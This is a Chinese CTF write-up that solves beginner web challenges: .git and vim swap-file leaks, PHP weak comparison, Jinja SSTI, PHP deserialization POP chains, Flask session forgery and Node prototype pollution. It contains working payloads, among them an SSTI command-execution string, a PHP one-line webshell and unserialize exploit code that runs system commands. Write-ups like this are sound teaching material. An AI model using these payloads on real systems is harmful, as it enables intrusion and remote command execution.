## Web入门指西/东

很简单, 可以看到有一串神必代码, 

![image-20230912183203683](https://raw.githubusercontent.com/Utahamo/momopic/main/image2023-9/202309121832715.png)

当然为了降低难度, 只是用了一次16进制转码, 在线工具或者是查看网页源代码可以看到一个js函数, 都可以解密

在线网站如https://hashes.com/en/tools/hash_identifier

把这串码放进去解密就能得到flag

## Web_没有保存的文件

题目描述vim和断电, vim没有保存的话退出会保存一个.flag.swp文件, 如果再次没保存退出的话会生成.flag.swo文件, 以此类推

本题访问.flag.swo即可下载文件, 读取获得flag

![image-20231009151100844](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091511895.png)



## git很好用

如果用过git, 我们会在文件夹中发现一个.git文件夹, 具体的解释可以查一下, 我们需要知道这个文件夹保存了上次提交的文件的记录, 并且能够还原回文件

如果使用提交后删除文件, 那么.git中还会保存记录, 姐可以还原这个文件

访问网页, 随便试一下/flag, 不存在

![image-20231009151507335](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091515364.png)

如果是/.git

![image-20231009151522130](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091515154.png)

403 forbidden而不是404 not found说明存在.git, 我们使用工具githacker

https://github.com/lijiejie/GitHack

![image-20231009151641937](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091516992.png)

可以发现已经检查到了文件并且下载到我们本地了, 查看flag获得flag

## 好多的php

上来给了串密文, 看最后的两个==就知道是base64, 解密发现

> 我不是flag, flag在别的地方(

根据题目信息

![image-20230912192530289](https://raw.githubusercontent.com/Utahamo/momopic/main/image2023-9/202309121925311.png)

猜测应该有别的界面, 用dirsearch之类的目录爆破工具扫描一下

得到admin.php, 打开

```php
<?php
header("Content-Type: text/html; charset=UTF-8");
error_reporting(0);
include "./F14g.php";
highlight_file(__FILE__);


$get = $_GET['flag1'];
$post1 = $_POST['flag2'];
$post2 = $_POST['flag3'];
if(isset($get)&&isset($post1)&&isset($post2)){
    if($get == '0e1234567'  && $get !== '0e1234567'){
        if(($post1 !== $post2 && md5($post1) === md5($post2))){
            echo '恭喜喵<br>';
            echo $flag;
        }
        echo '最后一层, ^~^<br>';
    }
    echo "www, 下一层怎么办呢<br>";
}
```

设计到php的弱比较, ==是弱比较, 比较值, 0e开头的是科学计数法

后面post传入flag2和flag3, 设计到md5的比较绕过, 这里没有强制转换传入参数为字符串, 我们只要传入两个数组, 而数组遇到md5或是sha加密的时候结果为null(空), 因此条件成立

最终payload: 

![image-20230912193644695](https://raw.githubusercontent.com/Utahamo/momopic/main/image2023-9/202309121936730.png)



## 简单的ssti

是ssti, 但是怎么做可能需要一段时间多去了解一下

如果你在网上搜一搜应该能找到如下的payload, 但是执行失败了, 其实是类没有找对的问题

```text
{{''.__class__.__mro__[1].__subclasses__()[75].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls").read()')}}
```

![image-20230913154318643](https://raw.githubusercontent.com/Utahamo/momopic/main/image2023-9/202309131543676.png)

![image-20230913154343580](https://raw.githubusercontent.com/Utahamo/momopic/main/image2023-9/202309131543605.png)

python程序的初始化的类并不是一样的, 所以这个数组的下标并不是固定的

本题给出两个思路吧

最简单的思路是使用自动化工具, 如tplmap或者是fenjing等, 会用就是一键flag

也可以选择自己写个脚本找到含有危险方法如eval的类

给出我的脚本吧, 没写完也懒得改了, 凑合用了

```python
import requests
import re
url = 'http://192.168.196.125:5000/test?{{().__class__.__base__.__subclasses__()}}'
list = ["warnings.catch_warnings","commands","FileLoader","IncrementalEncoder","IncrementalDecoder","_wrap_close"]
def test(url, choice):
    # url = input()
    if choice == '1':
        print(1)
        req = requests.get(url)
        que = re.findall(r"&lt;class .*?&gt;",req.text)
        # print(req.)
        # print(que)
        for i in range(len(que)):
            for j in list:
                if j in que[i]:
                    print(str(i)+"   "+j)
    elif choice == '2':
        for i in range(200):
            req = requests.post()

if __name__ == '__main__':
    # url = input()
    print("get 1或者是post 2")
    choice = input()
    test(url,choice)
```

找到之后就可以用payload了, 解法不唯一, 能拿到flag就是好方法



## 一句话木马的使用

网页是这样的

![image-20231009153518640](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091535670.png)

我们可以上传文件, 这里上传一句话木马之类的, shell.php

我用的是直接执行系统命令的shell

```php
<?=shell_exec($_REQUEST['cmd']);?>
```

执行命令, ls, cat /flag, 拿到flag



## ez_unserialize

php反序列化入门

```php
<?php
class CHIVE{
    public $hello = '';
    public function __destruct(){
        eval($this->hello);
    }
}
if(isset($_GET['chive'])){
    unserialize( $_GET['chive']);
}else{
    highlight_file(__FILE__);
}
?>
```

我们get传入的chive参数会被反序列化, 反序列化可以把数据转换为实体对象

__destruct()函数在类对象被销毁的时候调用, 也就是会执行对象的hello变量

想要反序列化, 我们首先需要序列化一个对象

```php
class CHIVE{
    public $hello = '';
//    public function __destruct(){
//        eval($this->hello);
//    } // 注释掉是因为序列化对象的过程在最后也会调用销毁, 执行命令, windows cmd执行ls会报错
}
$a = new CHIVE(); // 创建对象实例
$a->hello = "system('ls');"; // 给对象的变量赋值
echo serialize($a); // 打印序列话对象

// 结果
O:5:"CHIVE":1:{s:5:"hello";s:13:"system('ls');";}
```

每串字符的具体意思不必多说, 自行了解

之后我们把这个序列化的字符串发送过去, 回显成功

![image-20231009155151144](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091551172.png)

之后把命令改成cat /flag, 就可以执行命令了

另外有很多种修改对象的方法, 看个人喜好, 比如

```php
class CHIVE{
    public $hello = "system('dir');";
}
$a = new CHIVE();
```

或者

```php
class CHIVE{
    public $hello = "";
    public function __construct()
    {
        $this->hello = "system('dir');";
    }
}
$a = new CHIVE();
```





## hard_unserial

也是简单的反序列化, 利用链很短

```php
<?php
include('./hint.php');
class CHIVE1
{
    public $aa = "show_me_flag";
    public $bb;
    public $source;
    public function __wakeup()
    {
        if ($this->aa == "show_me_flag") {
           hint();
        }
    }
}

class CHIVE2
{
    public $dd;
    public function __toString()
    {
        $dd = $this->dd;
        $dd();
        return "1";
    }
}
class CHIVE3{
    public $bb;
    public $source = '';
    public function __invoke()
    {
        $this->bb->source;
    }
}
class CHIVE4{
    public $ee;
    public function __get($name)
    {
        eval($this->ee);
    }
}


if(isset($_GET['chive'])){
    @unserialize($_GET['chive']);
}else{
    highlight_file(__FILE__);
}
```

这种题目先找入口和重点, 也就是反序列化调用之后有那个函数是会被调用的, 以及在哪里执行命令

看到 `__wakeup(),` 反序列化时候会被调用, 因此我们先实例化一个 `CHIVE1`类对象

在 `__wakeup()`方法中, 使用了 `$this->aa == "show_me_flag"`, 把 `aa`和字符串进行了比较, 这个时候我们要去找有没有 `__tostring()`

`__tostring()`在 `CHIVE2`中, 因此我们让 `aa = new CHIVE2();`

在 `__tostring()`方法中, 直接把 `dd`当成了函数调用, 调用函数找一下有没有 `__invoke()`方法

 `__invoke()`在 `CHIVE3`中, 因此我们让 `dd = new CHIVE3();`

在 `__invoke()`方法中, 调用了 `bb->source`, 也就是调用了 `bb`的 `source`方法
如果 `bb`不存在 `source`方法, 就会调用 `bb`的 `__get()`方法

因此我们让 `bb = new CHIVE4();`, 执行 `eval()`, 的 `ee`, 到达终点

pop链如下

```php
CHIVE1::__wakeup() -> CHIVE2::__toString() -> CHIVE3::__invoke() -> CHIVE4::__get()
```

 编写poc

```php
<?php

class CHIVE1
{
    public $aa = "show_me_flag";
    public $bb;
    public $source;
}

class CHIVE2
{
    public $dd;
}
class CHIVE3{
    public $bb;
    public $source = '';
}
class CHIVE4{
    public $ee;
}
$a = new CHIVE1();
$a->aa = new CHIVE2();
$a->aa->dd = new CHIVE3();
$a->aa->dd->bb = new CHIVE4();
$a->aa->dd->bb->ee = "echo `ls`;";
$p = serialize($a);
echo $p;
// unserialize($p);
```

写法不止一种, 按自己喜好来, 然后get方法传入code就可以执行任意命令, 之后无论是写入shell文件还是直接cat flag都可以了



## 八嘎八嘎🤭

flask-session伪造, 题目给出的nanamo_is_so_cute是key

使用工具flask-session-cookie-manager

https://github.com/noraj/flask-session-cookie-manager

git clone下来

不会用的话有-h, 比如

`python .\flask_session_cookie_manager3.py -h`

`python .\flask_session_cookie_manager3.py decode -h`

网页打开发现是雌小鬼在嘲讽不认识, 所以我们去看cookie

![image-20231009165624178](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091656244.png)

GZCTF_Token是框架自带的, 我们注意session, 复制下来解码看一下

```bash
❯ python flask_session_cookie_manager3.py decode -c eyJoZXJvIjowfQ.ZSPAFw.7J6Vknnhko0OiEwWAYpM_KSGq0A
b'{"hero":0}'
```

我们复制下来格式, 然后再重新encode一下

```bash
❯ python flask_session_cookie_manager3.py encode -t '{"hero":1}' -s 'nanamo_is_so_cute'
eyJoZXJvIjoxfQ.ZSPBbA.kVgmOnYml2TrSJOluxnbG9zyCdM
```

-s后面的是key

然后复制过来, 修改cookie, 刷新就可以拿到flag了



## 扎古扎古😜

上来给了两个路由, /parse和/hint, 想看/hint

![image-20231009170425699](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091704730.png)

原型链污染是nodejs的类型题目, 也就是说服务器上有一个属性是isAdmin

给出的数据是json格式, 我们用post方法可以提交一下,  用burpsuite或者postman或是别的什么都行, 我这里用的是Talend API Tester浏览器插件

![image-20231009170841781](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091708833.png)

![image-20231009170851345](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091708377.png)

所以我们要成为isAdmin, 原型链的最简单的利用放上面

```json
{"__proto__": {"isAdmin": "nanamo"}}
```

![image-20231009170936734](https://cdn.jsdelivr.net/gh/Utahamo/momopic/image2023-9/202310091709777.png)

得到flag了

